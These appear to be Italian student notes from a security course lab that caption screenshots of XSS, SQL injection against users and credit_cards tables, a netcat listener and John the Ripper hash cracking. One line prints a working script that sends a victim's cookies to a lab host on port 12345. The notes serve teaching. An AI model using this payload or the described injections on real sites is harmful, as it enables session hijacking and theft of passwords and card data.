# LezioneS6_L5

Screenshot 1:  Lo script <script>window.location="http://192.168.50.100:12345/?cookie"+document.cookie</script> imposta la posizione del browser a un URL specifico (http://192.168.50.100:12345/)
               aggiungendo i cookie dell'utente (document.cookie) alla fine dell'URL come parametro.
Screenshot 2:  Il server rimane in ascolto sulla porta 12345. Quando un client si connetterà a questa porta, netcat mostrerà i dati inviati dal client sullo stdout
Screenshot 3:  La stringa è un'attacco di SQL injection per recuperare le informazioni sugli utenti e le password dalla tabella users di un database.
Screenshot 4:  Il comando esguito è una chiamata al programma John the Ripper, un popolare strumento di cracking delle password. Questo comando viene utilizzato per eseguire un attacco di forza bruta o di dizionario per cercare di recuperare le password da un file hash MD5.
Screenshot 5:  Questa stringa è simile allo screenshot 3, dove l'obiettivo è quello di ottenere informazioni sensibili come il numero della carta di credito (ccnumber) e il codice di verifica della carta di credito (ccv) dalla tabella credit_cards.
Screenshot 6:  Questa stringa è un tentativo di attacco di SQL injection, simile allo Screenshot 3 e 5. L'obiettivo sembra essere quello di recuperare informazioni sensibili come i numeri 
               delle carte di credito (ccnumber) e le date di scadenza delle carte di credito (expiration) dalla tabella credit_cards di un database, presumibilmente all'interno di un'applicazione vulnerabile.
Screenshot 7:  Questa stringa esegue un'attacco di SQL injection per ottenere informazioni sulle colonne della tabella credit_cards da uno schema di informazioni (information_schema).
Screenshot 8:  Questa stringa è un attacco di SQL injection per ottenere informazioni sulle tabelle presenti nel database utilizzando lo schema di informazioni (information_schema).
Screenshot 9:  Questa stringa esegue un attacco di SQL injection per ottenere informazioni sulle tabelle presenti nel database utilizzando lo schema di informazioni (information_schema).
Screenshot 10: Questa stringa esegue un attacco di SQL injection per recuperare informazioni sulle colonne della tabella 'users' utilizzando lo schema di informazioni (information_schema)
Screenshot 11: Questa stringa esegue un attacco di Cross-Site Scripting (XSS) inserendo uno script JavaScript malevolo all'interno di un input, come un campo di un modulo web.
               Lo script <script>alert(document.cookie)</script> è progettato per mostrare una finestra di avviso nel browser dell'utente contenente il valore dei cookie del sito web corrente.
Screenshot 12: Questa stringa esegue un'attacco di SQL injection in ambiente security level Medium per recuperare le informazioni sugli utenti e le relative password dalla tabella users di un database. 
               L'obiettivo di questa query è quello di combinare i risultati della condizione 1 = 1 (che è sempre vera) con i risultati della selezione delle colonne user e password dalla tabella users.

